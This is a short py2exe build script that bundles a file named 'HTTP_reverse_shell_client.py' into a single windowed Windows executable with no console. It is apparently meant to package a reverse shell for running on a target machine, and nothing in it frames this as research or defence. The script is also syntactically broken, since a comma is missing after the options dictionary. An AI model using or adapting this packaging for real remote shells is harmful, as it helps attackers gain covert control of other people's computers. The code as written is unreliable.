from distutils.core import setup
import py2exe, sys, os


sys.argv.append("py2exe")
setup(
    options = {'py2exe': {'bundle_files': 1}}
    windows = [{'script': "HTTP_reverse_shell_client.py"}],
    zipfile = None,
)